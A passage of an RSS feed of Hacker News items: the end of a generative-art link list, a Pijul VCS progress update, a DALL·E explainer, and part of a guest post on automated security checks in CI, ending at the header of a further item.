<p><a href="https://thegradient.pub/the-past-present-and-future-of-ai-art/">https://thegradient.pub/the-past-present-and-future-of-ai-art/</a></p>
<p><a href="https://inconvergent.net/thoughts-on-generative-art/">https://inconvergent.net/thoughts-on-generative-art/</a></p>
<p><a href="http://www.generative-gestaltung.de/2/">http://www.generative-gestaltung.de/2/</a></p>
<p><a href="https://github.com/terkelg/awesome-creative-coding">https://github.com/terkelg/awesome-creative-coding</a></p>
<p><a href="https://www.awwwards.com/creative-code-css-javascript-webgl-and-three-js-experiments.html">https://www.awwwards.com/creative-code-css-javascript-webgl-and-three-js-experiments.html</a></p>
<p><a href="https://www.artnome.com/news/2020/8/24/interview-with-generative-artist-jared-tarbell">https://www.artnome.com/news/2020/8/24/interview-with-generative-artist-jared-tarbell</a></p>
<p><a href="https://livebook.manning.com/book/generative-art/chapter-1/1">https://livebook.manning.com/book/generative-art/chapter-1/1</a></p>
<p><a href="https://www.invaluable.com/blog/generative-art/">https://www.invaluable.com/blog/generative-art/</a></p>
<h3 id="examples">Some examples of generative art (random and very limited selection)<a href="#ref1">↑</a></h3>
<p><a href="http://zenbullets.com/">http://zenbullets.com/</a></p>
<p><a href="https://inconvergent.net/">https://inconvergent.net/</a></p>
<p><a href="http://www.complexification.net/gallery/">http://www.complexification.net/gallery/</a></p>
<p><a href="http://kylemcdonald.net/">http://kylemcdonald.net/</a></p>
<p><a href="https://www.instagram.com/praystation">https://www.instagram.com/praystation</a></p>
<p><a href="http://manoloide.com/">http://manoloide.com/</a></p>
<p><a href="https://scottdraves.com/portfolio.html">https://scottdraves.com/portfolio.html</a></p>
<p><a href="https://www.mattdesl.com/">https://www.mattdesl.com/</a></p>
<p><a href="https://generated.space/">https://generated.space/</a></p>
<p><a href="https://www.creativeapplications.net/tag/creative-code/">https://www.creativeapplications.net/tag/creative-code/</a></p>
<p><a href="https://spite.github.io/looper/#5">https://spite.github.io/looper/</a></p>
<p><a href="https://tinkersynth.com/">https://tinkersynth.com/</a></p>
<h3>Creative coding tools &amp; frameworks</h3>
<p><a href="https://www.openprocessing.org/">https://www.openprocessing.org/</a></p>
<p><a href="https://processing.org/">https://processing.org/</a></p>
<p><a href="https://openframeworks.cc/about/">https://openframeworks.cc/about/</a></p>
<p><a href="https://libcinder.org/about">https://libcinder.org/about</a></p>
<p><a href="https://nannou.cc/">https://nannou.cc/</a></p>
<h3>Lectures &amp; tutorials</h3>
<p><a href="https://generativeartistry.com/tutorials/">https://generativeartistry.com/tutorials/</a></p>
<p><a href="https://www.skillshare.com/classes/Programming-Graphics-I-Introduction-to-Generative-Art/782118657">https://www.skillshare.com/classes/Programming-Graphics-I-Introduction-to-Generative-Art/782118657</a></p>
<p><a href="https://www.futurelearn.com/courses/creative-coding">https://www.futurelearn.com/courses/creative-coding</a></p>
<p><a href="https://www.coursera.org/learn/digitalmedia">https://www.coursera.org/learn/digitalmedia</a></p>
<p><a href="https://www.kadenze.com/courses/creative-programming-for-audiovisual-art/info">https://www.kadenze.com/courses/creative-programming-for-audiovisual-art/info</a></p>
<p><a href="https://observablehq.com/@makio135/creative-coding">https://observablehq.com/@makio135/creative-coding</a></p>
<p><a href="https://frontendmasters.com/courses/canvas-webgl/">https://frontendmasters.com/courses/canvas-webgl/</a></p>
<p><a href="https://www.creativebloq.com/how-to/get-started-with-webgl-using-threejs">https://www.creativebloq.com/how-to/get-started-with-webgl-using-threejs</a></p>
<h3>Artificial creativity</h3>
<p><a href="https://algorithms.design/">https://algorithms.design/</a></p>
<p><a href="https://aeon.co/ideas/there-is-no-such-thing-as-computer-art-it-s-all-just-art">https://aeon.co/ideas/there-is-no-such-thing-as-computer-art-it-s-all-just-art</a></p>
<p><a href="https://components.ai/about">https://components.ai/</a></p>
<p><a href="https://en.wikipedia.org/wiki/Low-complexity_art">https://en.wikipedia.org/wiki/Low-complexity_art</a></p>

			</div></div>]]>
            </description>
            <link>https://grgv.xyz/creative_code_synthesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689150</guid>
            <pubDate>Fri, 08 Jan 2021 19:33:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pijul VCS: How to Survive?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688941">thread link</a>) | @Klasiaster
<br/>
January 8, 2021 | https://pijul.org/posts/2021-01-05-how-to-survive/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2021-01-05-how-to-survive/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Tuesday, January 5, 2021</p><p>Since we released the alpha version of Pijul 1.0 two months ago, a lot of things have happened.
In this post, I want to share some of them, and give a roadmap for the next few weeks or months.</p><h2 id="achievements-of-the-last-two-months">Achievements of the last two months</h2><p>I’m happy to announce that we are now very close to a beta version of Pijul. A number of things needed to be fixed, and they have indeed been fixed. In particular:</p><ul><li><p>We had a number of issues with SSH keys and unintuitive error messages related to network errors. For example, a temporary connection drop used to be fatal for HTTP connections, whereas Pijul can easily recover from that now. These issues looked really bad, but were actually fairly easy to fix.</p></li><li><p>The core algorithms were “almost there” when I announced the initial alpha, but, as I explain below, weren’t totally ready. In particular, the patch format has needed to change once. I haven’t maintained a “Changelog” file since the beginning, but that is also because most entries in that log would have been of the form “correctness of apply” or “correctness of unrecord”.</p></li><li><p>Sanakirja (our database backend), now performs more checks to detect disk errors, either accidental (the user overwrites the file) or physical (disk failures). This obviously comes with a small performance hit, but there is probably still room for optimisation there.</p></li><li><p>On the “software engineering” side of things, I’ve recently simplified the design of the library. We used to have two giant traits to describe all the operations that could be done on a repository: for example <code>record</code> and <code>output</code> needs to look at the <em>pristine</em> and at the <em>current working copy</em>, but with different mutability, while <em>apply</em> only needs one channel of the <em>pristine</em>. There are many functions like that in Pijul, requiring overlapping subsets of the trait, which makes the boundaries somewhat unclear.</p><p>One of my recent patches simplifies that design by splitting these traits into smaller pieces, in order to make it easier to write alternative backends. The consequence is that many functions now require complicated trait bounds, such as <code>ChannelTxnT + TreeTxnT + ChannelIter</code>. Also, there is still a large number of macros, but this is also because Sanakirja still has an unsafe interface (in part due to the lack of generic associated types in Rust) and needs wrappers to be used safely.</p></li><li><p>We have a basic CI system on the Nest, but it is currently only enabled for a few projects, including <a href="https://nest.pijul.com/pijul/pijul/ci">Pijul itself</a>. It is based on <a href="https://nixos.org/">Nix</a>, which makes it really fast for building the same project over and over. The main reason for the restriction is that it only started to work reliably in the last few days, another reason is our limited computational resources. We plan to generalise it soon to more backends than Nix, and to open it to all public projects on the Nest. The ability to efficiently go back to arbitrary versions (work in progress) could make this quite useful.</p></li><li><p>Among the improvements to the Nest, the <a href="https://nest.pijul.com/explore">“Explore” page</a> is a first step towards making this more social. I hope to be able to expand the social features of the Nest very soon.</p></li></ul><h2 id="roadmap-and-current-projects">Roadmap and current projects</h2><ul><li><p>One crucial thing for the future of Pijul is its integration into existing workflows and tools. The top priorities in that direction are to get text editors to support Pijul. I did start <a href="https://nest.pijul.com/pmeunier/vscode-pijul">a draft for a VSCode plugin</a> in November, but I’m happy to see that <a href="https://nest.pijul.com/GarettWithOneR/pijul-vscode">GarettWithOneR</a> is moving much faster, and making great progress in that direction.</p></li><li><p>We need to be more generic in our diff algorithm: at the moment, the diff is line-based, but all the algorithms in Pijul can already handle binary or word-based diff algorithms. This is probably a rather easy project, but might require some global changes in order to deal with conflicts. Once this is done, a <a href="https://unity.com/">Unity</a> plugin could become possible and useful.</p></li><li><p>Another project I’ve started is a way to handle gigantic repositories, especially going back to tags arbitrarily far in the past. At the moment, going back in time means unapplying all the changes since the time one wants to go back to, which isn’t really acceptable for very large repositories. Once this is implemented, I’ll run a series of benchmarks on large projects and files, and report the results here.</p></li><li><p>We’re quite close to finally moving to the beta phase. The algorithms are starting to be well tested, and have solid mathematical proofs. The initial quirks are almost all gone. Before that, I want to solve (or at least close) all the currently open discussions in our main repository.</p></li><li><p>I want to finish the <code>rollback</code> command, which makes the “inverse” patch of another patch. This is currently implemented in libpijul, but still has one bug where inverting a conflict resolution doesn’t really work. Related to this, a more long-term goal is to handle code block movements: at the moment, Pijul’s behaviour is similar to other distributed version control systems, but there could be ways to do better.</p></li></ul><h2 id="only-one-major-catastrophe-leading-to-a-reset-of-history">Only one major catastrophe, leading to a reset of history</h2><p>This is the most crucial metric for this project: a history reset is needed when we need to change the on-disk representation for one reason or another.
It happened a few times in the past, and did happen again after the current alpha was published. This is, however, very unlikely to ever happen again.</p><p>What happened was, after only a few days of using Pijul for itself, I started noticing an issue with <code>pijul unrecord</code>, where patches were somehow “lossy”, in the sense that they didn’t contain enough information to unapply them (I now have a clear proof that the current patch format doesn’t lose anything).</p><p>Here is the specific issue: Pijul represents blocks of bytes in a graph, where edges are labelled with their status (deleted, alive, etc.). The recent improvements in the algorithm introduced the possibility to <em>split</em> vertices, which has made it necessary to add new statuses to detect when that happened.</p><p>Then, patches can add new vertices, or map the statuses of existing edges. I initially thought that the new statuses could be computed at apply time, but I was wrong, because I don’t know how to compute them when unrecording. Indeed, in order for the map of edge statuses to be invertible, it must be one-to-one, which wasn’t the case.</p><p>This has led me to reset the repository after just one week, changing the patch formats in the process. This was two months ago, and after that happened, I’ve started to work on a proof that the algorithms are correct, which I hope to publish soon.</p><h2 id="thank-you">Thank you!</h2><p>When I started implementing the new algorithms a few months ago, the community was rather small. However, the fragile, clunky, alpha version grew significantly beyond my expectations. In particular, a number of people have made great contributions to the code, ranging from fixing a minor compilation error, to new features, design discussions, etc.</p><p>It is very hard to make an exhaustive list of all the people who have made this project what it is today. <a href="https://www.univ-orleans.fr/lifo/Members/Florent.Becker/">Florent Becker</a> provided the initial impulse, as well as many insights, code contributions, and friendly support for years.
Also, the current state of things wouldn’t have been possible either without the enthusiasm of <a href="https://nest.pijul.com/lthms">lthms</a>, <a href="https://nest.pijul.com/tae">tae</a>, <a href="http://skade.me/profile.html">Florian Gilcher</a>, among others.</p><p>I want to thank <a href="https://octobus.net/#pyd">Pierre-Yves David</a>, <a href="http://igm.univ-mlv.fr/~bulteau/">Laurent Bulteau</a> and <a href="https://www.irif.fr/~horn">Florian Horn</a>, with whom I’ve started a collaboration on research topics related to version control. Pierre-Yves is one of the main contributors to Mercurial, and the founder of <a href="https://octobus.net/">Octobus</a>, which looks like a really cool company if you’re interested in Rust, version control systems, or (and especially) both.</p><p>I would also like to thank all the new contributors of the last two months, <a href="https://nest.pijul.com/pijul/changes">listed here</a>. In particular, <a href="https://nest.pijul.com/cole-h">cole-h</a> and
<a href="https://nest.pijul.com/loewenheim">loewenheim</a> have contributed to many discussions and proposed many improvements, ranging from compilation errors to colours in the change visualisation, to the ergonomics of a number of commands (<code>pijul record --amend</code> or <code>pijul unrecord</code> are just examples). And <a href="https://nest.pijul.com/danieleades">danieleades</a> taught me about modern error management in Rust (I had not looked into that topic since the days of error-chain).</p><p>Pijul is based on a number of layers, and there have also been great contributions on them: <a href="https://nest.pijul.com/pijul/manual/changes">the manual</a> has seen many contributions. <a href="https://nest.pijul.com/jason-ni">Jason-ni</a> patiently tested asynchronous issues in <a href="https://nest.pijul.com/pijul/thrussh">Thrussh</a>.</p><p>I also want to give special thanks to <a href="https://nest.pijul.com/tankf33der">tankf33der</a>, who has patiently discovered a truly impressive number of bugs. Some of these bugs were easy to fix (such as making HTTPS more secure on this site and <a href="https://nest.pijul.com/">nest.pijul.com</a>), others required deep redesigns (such as introducing CRC checks in Sanakirja to detect disk errors). Many of them seem to have been inspired by a “what if?” testing methodology rather than actual usage, which led to small, reproducible test cases. The title of this post (“how to survive”) was inspired by a message from him after one of my patches once again broke his repository (sorry about that!).</p><p>Finally, I wanted to thank <a href="https://paulhammant.com/">Paul Hammant</a> for giving me really useful insights about his professional experience as a trunk-based development consultant, and the possible future of Pijul as a trunk-based development tool. If you’re interested in development methodology, you might enjoy reading about <a href="https://paulhammant.com/2020/01/19/vcs-nirvana/">his VCS Nirvana</a>, as well as other posts on his blog.</p><h2 id="advent-of-code-2020">Advent of Code 2020</h2><p>A number of adventurous people have used the <a href="https://adventofcode.com/">Advent of Code</a> puzzles to learn Pijul, which I find really cool.</p><p>I believe <a href="https://nest.pijul.com/emily">Emily</a> is the only one who completed <a href="https://nest.pijul.com/emily/advent-of-code">all 25 puzzles</a>.</p><p><a href="https://nest.pijul.com/CT075">CT075</a> came close with <del>22</del> <a href="https://nest.pijul.com/CT075/advent-of-code-2020">24 puzzles solved</a>.</p><p>The others I know of are (in alphabetical order) <a href="https://nest.pijul.com/henil/advent-of-code">henil</a>, <a href="https://nest.pijul.com/idmyn/advent-of-code">idmyn</a>, <a href="https://nest.pijul.com/jraregris/advent2020">jraregris</a>, <a href="https://nest.pijul.com/krixano/adventofcode">krixano</a>.</p><h2 id="chat">Chat</h2><p>We’ve had an IRC channel on Freenode for a long time, but neither Florent nor myself have been very active on it.
I’ve never been really good at IRC: I find simultaneous conversations hard to follow and history impossible to search. Many things require bots I don’t have the time to write, including mentions, direct messages, etc.</p><p>After reading <a href="http://exple.tive.org/blarg/2019/09/06/forward-motion/">how Mozilla replaced their IRC server</a>, taking opinions of the community, I decided to try out <a href="https://zulip.com/">Zulip</a>.</p><p>The address is <a href="https://pijul.zulipchat.com/">https…</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pijul.org/posts/2021-01-05-how-to-survive/">https://pijul.org/posts/2021-01-05-how-to-survive/</a></em></p>]]>
            </description>
            <link>https://pijul.org/posts/2021-01-05-how-to-survive/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688941</guid>
            <pubDate>Fri, 08 Jan 2021 19:21:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Dalle Works in Under 5 Minutes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688913">thread link</a>) | @dalequark
<br/>
January 8, 2021 | https://daleonai.com/dalle-5-mins | <a href="https://web.archive.org/web/*/https://daleonai.com/dalle-5-mins">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>It seems like every few months, someone publishes a machine learning paper or demo that makes my jaw drop. This month, it’s OpenAI’s new image-generating model, <a href="https://openai.com/blog/dall-e/">DALL·E</a>.</p>

<p>This behemoth 12-billion-parameter neural network takes a text caption (i.e. “an armchair in the shape of an avocado”) and generates images to match it:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.37.37-pm.png" alt="Generated images of avocado chairs" title="Generated images of avocado chairs"></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>I think its pictures are pretty inspiring (I’d buy one of those avocado chairs), but what’s even more impressive is DALL·E’s ability to understand and render concepts of space, time, and even logic (more on that in a second).</p>

<p>In this post, I’ll give you a quick overview of what DALL·E can do, how it works, how it fits in with recent trends in ML, and why it’s significant. Away we go!</p>

<h2 id="what-is-dalle-and-what-can-it-do">What is DALL·E and what can it do?</h2>

<p>In July, DALL·E’s creator, the company OpenAI, released a similarly huge model called GPT-3 that wowed the world with <a href="https://daleonai.com/gpt3-explained-fast">its ability to generate human-like text</a>, including Op Eds, poems, sonnets, and even computer code. DALL·E is a natural extension of GPT-3 that parses text prompts and then responds not with words but in pictures. In one example from OpenAI’s blog, for example, the model renders images from the prompt “a living room with two white armchairs and a painting of the collosseum. the painting is mounted above a modern fireplace”:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-2.39.07-pm.png" alt="DALLE generated images" title="DALLE generated images"></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>Pretty slick, right? You can probably already see how this might be useful for designers. Notice that DALL·E can generate a large set of images from a prompt. The pictures are then ranked by a second OpenAI model, called <a href="https://openai.com/blog/clip/">CLIP</a>, that tries to determine which pictures match best.</p>

<h2 id="how-was-dalle-built">How was DALL·E built?</h2>

<p>Unfortunately, we don’t have a ton of details on this yet because OpenAI has yet to publish a full paper. But at its core, DALL·E uses the same new neural network architecture that’s responsible for tons of recent advances in ML: the <a href="https://arxiv.org/abs/1706.03762">Transformer</a>. Transformers, discovered in 2017, are an easy-to-parallelize type of neural network that can be scaled up and trained on huge datasets. They’ve been particularly revolutionary in natural language processing (they’re the basis of models like BERT, T5, GPT-3, and others), improving the quality of <a href="https://blog.google/products/search/search-language-understanding-bert/">Google Search</a> results, translation, and even in <a href="https://daleonai.com/how-alphafold-works">predicting the structures of proteins</a>.</p>

<p>Most of these big language models are trained on enormous text datasets (like all of Wikipedia or <a href="https://commoncrawl.org/"></a><a href="https://commoncrawl.org/">crawls of the web</a>). What makes DALL·E unique, though, is that it was trained on sequences that were a combination of words and pixels. We don’t yet know what the dataset was (it probably contained images and captions), but I can guarantee you it was probably massive.</p>

<h2 id="how-smart-is-dalle">How “smart” is DALL·E?</h2>

<p>While these results are impressive, whenever we train a model on a huge dataset, the skeptical machine learning engineer is right to ask whether the results are merely high-quality because they’ve been copied or memorized from the source material.</p>

<p>To prove DALL·E isn’t just regurgitating images, the OpenAI authors forced it to render some pretty unusual prompts:</p>

<p>“a professional high quality illustration of a giraffe turtle chimera.”</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.39.04-pm.png" alt=""></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>“a snail made of a harp.”</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.39.12-pm.png" alt=""></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>It’s hard to imagine the model came across many giraffe-turtle hybrids in its training data set, making the results more impressive.</p>

<p>What’s more, these weird prompts hint at something even more fascinating about DALL·E: its ability to perform “zero-shot visual reasoning.”</p>

<h2 id="zero-shot-visual-reasoning">Zero-Shot Visual Reasoning</h2>

<p>Typically in machine learning, we train models by giving them thousands or millions of examples of tasks we want them to preform and hope they pick up on the pattern.</p>

<p>To train a model that identifies dog breeds, for example, we might show a neural network thousands of pictures of dogs labeled by breed and then test its ability to tag new pictures of dogs. It’s a task with limited scope that seems almost quaint compared to OpenAI’s latest feats.</p>

<p>Zero-shot learning, on the other hand, is the ability of models to perform tasks that they weren’t specifically trained to do. For example, DALL·E was trained to generate images from captions. But with the right text prompt, it can also transform images into sketches:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.41.02-pm.png" alt=""></p>

<p><em>Results from the prompt, “the exact same cat on the top as a sketch on the bottom”. From https://openai.com/blog/dall-e/</em></p>

<p>DALL·E can also render custom text on street signs:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-2.51.53-pm.png" alt=""></p>

<p>Results from the prompt <em>“a store front that has the word ‘openai’ written on it’”. From https://openai.com/blog/dall-e/.</em></p>

<p>In this way, DALL·E can act almost like a Photoshop filter, even though it wasn’t specifically designed to behave this way.</p>

<p>The model even shows an “understanding” of visual concepts (i.e. “macroscopic” or “cross-section” pictures), places (i.e. “a photo of the food of china”), and time (“a photo of alamo square, san francisco, from a street at night”; “a photo of a phone from the 20s”). For example, here’s what it spit out in response to the prompt “a photo of the food of china”:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.42.22-pm.png" alt=""></p>

<p><em>“a photo of the food of china” from https://openai.com/blog/dall-e/.</em></p>

<p>In other words, DALL·E can do more than just paint a pretty picture for a caption; it can also, in a sense, answer questions visually.</p>

<p>To test DALL·E’s visual reasoning ability, the authors had it take a visual IQ test. In the examples below, the model had to complete the lower right corner of the grid, following the test’s hidden pattern.</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-07-at-1.22.26-pm.png" alt=""></p>

<p><em>A screenshot of the visual IQ test OpenAI used to test DALL·E</em> <em>from https://openai.com/blog/dall-e/.</em></p>

<p>“DALL·E is often able to solve matrices that involve continuing simple patterns or basic geometric reasoning,” write the authors, but it did better at some problems than others. When the puzzles’s colors were inverted, DALL·E did worse–“suggesting its capabilities may be brittle in unexpected ways.”</p>

<h2 id="what-does-it-mean">What does it mean?</h2>

<p>What strikes me the most about DALL·E is its ability to perform surprisingly well on so many different tasks, ones the authors didn’t even anticipate:</p>

<p>“We find that DALL·E […] is able to perform several kinds of image-to-image translation tasks when prompted in the right&nbsp;way.</p>

<p>We did not anticipate that this capability would emerge, and made no modifications to the neural network or training procedure to encourage it.”</p>

<p>It’s amazing, but not wholly unexpected; DALL·E and GPT-3 are two examples of a greater theme in deep learning: that extraordinarily big neural networks trained on unlabeled internet data (an example of “self-supervised learning”) can be highly versatile, able to do lots of things weren’t specifically designed for.</p>

<p>Of course, don’t mistake this for general intelligence. It’s <a href="https://lacker.io/ai/2020/07/06/giving-gpt-3-a-turing-test.html">not hard</a> to trick these types of models into looking pretty dumb. We’ll know more when they’re openly accessible and we can start playing around with them. But that doesn’t mean I can’t be excited in the meantime.</p>

    </div></div>]]>
            </description>
            <link>https://daleonai.com/dalle-5-mins</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688913</guid>
            <pubDate>Fri, 08 Jan 2021 19:20:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four levels of maturity that bridge the AppSec / engineering divide]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688143">thread link</a>) | @pabloest
<br/>
January 8, 2021 | https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p><em>This is a guest post authored by <a href="https://jacobian.org/" target="_blank" rel="noopener">Jacob Kaplan-Moss</a>, co-creator of Django.</em></p>
<h3>Introduction</h3>
<p>I’ve spent a good deal of my career with my feet in two different worlds. I came up as a web developer and helped create a popular web framework (Django). And I’ve spent a sizable chunk of my career working in information security.
Unfortunately, I’ve seen these two roles clash far too often. Engineering often sees Security as standing in the way of delivery, or as creating meaningless busywork. Security thinks Engineering is irresponsible, willing to ship broken or vulnerable code.</p>
<p>I’ve spent more than a decade trying to bridge this gap. There’s no silver bullet. But, over and over, I’ve seen one practice be quite effective: automated security tests — and particularly integrating security checks and tests into an existing CI pipeline.</p>
<h3>Bringing Security along on the CI/CD journey</h3>
<p>Engineers have largely embraced CI as a critical part of quality assurance, and that a robust test suite that runs on every commit is a huge enabler of velocity. We can be bold about making changes, knowing that the test suite will catch us if we’ve messed up. A mature CI/CD pipeline is a reliable litmus test for good software.</p>
<p>Historically, though, Security has been left out of this CI/CD journey. We’ve relied on manual security assessments; hands-on exercises like threat modelling and threat hunting; and bespoke penetration tests. These are important activities that will always have a place in a mature product security lifecycle, but they increasingly are difficult to integrate into an agile delivery model that relies on incremental changes and automated tests. Much of the friction between modern engineering and security teams can come down to this impedance mismatch.</p>
<p>So, to get Security and Engineering playing well together, one massively useful tool is getting security work integrated into continuous delivery. When done right, Security and Engineering work together to produce automated checks that cover security issues in the same test suite that’s already in CI. This maintains delivery cadence, gives confidence about the security of the product, and — most importantly — gives a place where Security and Engineering collaborate, rather than conflict, to produce secure code.</p>
<p>How does this look in practice? Each organization is different, but there’s a typical progression of maturity that Security and Engineering orgs go through as they build a continuous integration and automation pipeline:</p>
<ul>
<li>Level 1: Security finds problems; Engineering fixes them</li>
<li>Level 2: Security and Engineering collaborate to produce test cases and remediations</li>
<li>Level 3: After the issue is fixed, Security and Engineering collaborate to find systemic fixes and develop checks</li>
<li>Level 4: Security and Engineering now also proactively look for new classes of issues and create systemic checks before an actual problem occurs</li>
</ul>
<p>For the rest of this post, I’ll walk through each of these phases with a specific example about a team that systemically fixed an issue with logging sensitive tokens.</p>
<h3>Level 1: Security finds problems; Engineering fixes them</h3>
<p>This is (unfortunately) how many organizations operate. Nobody really works together: Security is off in one corner looking for vulnerabilities (or, worse, waiting for a breach and then responding!). When they find one, they tell Engineering, who (hopefully) fixes the problem.</p>
<p>Let’s begin the example and see how this could shake out in practice. A few months ago, Nathan Brahams <a href="https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/" target="_blank" rel="noopener">wrote about systemically fixing an issue around accidentally logging sensitive tokens</a>. His article illustrates the steps a quite mature security/engineering organization would take, but I’ll use this issue as a jumping-off-point to imagine how teams earlier in their journey might approach discovering a similar issue.</p>
<p>So, imagine a budding team has found this security issue: SQLAlchemy debug logging is turned on and sensitive tokens are being logged. The issue is fixed with a clever technique that uses a custom <code>ObfuscatedString</code> column that prevents SQLAlchemy from logging the token's value. So, we just swap in <code>ObfuscatedString</code> for the token column. Problem solved, right?</p>
<p>Well, while this does fix the issue, it has many problems:</p>
<ul>
<li><strong>Verification</strong>: If Engineering just rolls out this fix, how do we verify that the issue is actually fixed? Usually at this level of maturity, the Security team will manually verify the fix, but that’s error-prone. It’s also slow; if the fix didn’t work or is incomplete, the cycle has to repeat itself.</li>
<li><strong>Regression</strong>: If another engineer, some time later, doesn’t understand this <code>ObfuscatedString</code>, it could get reverted or modified in a way that re-introduces the issue. How would we know if this happens? (Spoiler alert: with an automated test, which we’ll discuss in the next section.)</li>
<li>Is this a one-off issue, or <strong>is it a systemic issue</strong>? Are there other sensitive values elsewhere that might be logged?</li>
<li><strong>Conflict</strong>: Most importantly, this workflow sets up conditions ripe for conflict between Security and Engineering. It creates a dynamic where it’s easy for Engineering to feel like Security’s just creating work for them, and where Security can feel ignored or powerless to fix problems. I’ve never seen this model produce a really healthy relationship; just ones with varying levels of dysfunction. Even when Security helps write the fix, the lack of any sort of robust verification or systemic analysis means it’s very likely they’ll need to come back later with this issue or a similar one again, which both parties will resent.</li>
</ul>
<h3>Level 2: automated tests</h3>
<p>The next rung on the maturity ladder is one that’s becoming increasingly common: instead of just fixing a security issue, Security and Engineering will collaborate on producing a test case (and often the fix). Following along with the example above, we might write a test case that sets up a test model with an <code>ObfuscatedString</code> column, captures some logs, and verifies that the value is correctly obfuscated.</p>
<p>This relatively simple addition fixes a bunch of problems we had before:</p>
<ul>
<li><strong>Verification</strong>: If the test case passes, we can be confident the security issue is fixed.</li>
<li><strong>Regression</strong>: Because this test case is part of our test suite, if it ever regresses the test case will fail, and we won’t risk re-introducing it to production.</li>
<li><strong>Collaboration</strong>: Security and Engineering are now working more closely together, increasing the chances both teams will see this as “our issue” and “our fix”, not “their problem”.</li>
</ul>
<p>But: we still lack any sort of understanding of whether this issue occurs elsewhere, or any sort of holistic fix for the entire class of issues. In the case of logging sensitive tokens, it’s easy to imagine this issue occurring elsewhere. So when — inevitably — a similar issue occurs elsewhere, we’re likely to be bitten again. And this, in turn, will continue to produce the kind of resentment that can be so damaging to Security/Engineering working well together.</p>
<h3>Level 3: systemic fixes and checks</h3>
<p>The next step, then, is for Security and Engineering to work together to find systemic problems and fixes. Things start out as above — it’s important to fix the specific vulnerability first, before getting fancy! But after the specific fix is in, Security and Engineering come together to figure out if this is a systemic problem. If so, they work to develop a check or a fix.</p>
<p>Sometimes this can be a fairly simple holistic fix. For example, <a href="https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/" target="_blank" rel="noopener">I wrote about ReDoS last time</a>. Discovery of a ReDoS vulnerability might lead to discovering other similar potential problems. That in turn could lead to the decision to switch to <a href="https://github.com/google/re2" target="_blank" rel="noopener">re2</a>, which isn’t vulnerable to ReDoS.</p>
<p>But much of the time, the systemic fix is more complex — there isn’t a simple drop-in replacement that eliminates a class of vulnerabilities. That’s true of this sensitive-logging issue: we don’t have any sort of logging module that can magically know when variables are sensitive, and obfuscate them.</p>
<p>This is where code scanning tools like Semgrep come in. They are a terrifically important part of a mature product security workflow. Traditional testing practices — unit tests, integration tests, etc — are great for reproducing specific security issues, and ensuring that they’re fixed and won’t regress. But they struggle to discover whole classes of security issues, and this is what code scanners enable. Traditional code linters (e.g., Flake8, RuboCop) help to ensure code consistency and find some common issues, but since they have to apply generally to all kinds of projects, they tend to only provide a one-size-fits-all best-practices check. Tools that understand code semantically, like Semgrep, can be used to write tests for <em>your unique codebase</em> and find whole classes of security issues — including, most importantly, new instances of a problem that might be added after the check has been written.</p>
<p>And indeed, that’s what Nathan and his team did: they wrote a Semgrep rule that finds columns with names suggesting they’re sensitive (e.g., containing “token”, “secret”, “key”, etc), and issues a warning.</p>
<p>At this point, we’re in a pretty good spot. New code is continually scanned for this issue, and when found, they are fixed robustly. We have a workflow and tooling that ensures that the original, specific issue is fixed and that it stays fixed, and we ensure that similar issues — present and future — are discovered and fixed. Security and Engineering collaborate on this work, which is now well-automated. There’s still (of course) room for teams to not get along, but we’ve removed some of the most common pain points (verification, regression, conflict between teams).</p>
<p>If suddenly blocking builds with new checks will only increase conflict in your organization, you could softly roll out checks that do not block Engineering and only notify Security. For issues that arise, Security can begin conversations with Engineering to collaborate on both specific and systemic fixes. Once the check is satisfactory to both …</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/">https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688143</guid>
            <pubDate>Fri, 08 Jan 2021 18:40:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Cultural Purge Is Now in Overdrive]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688127">thread link</a>) | @StuntPope
<br/>
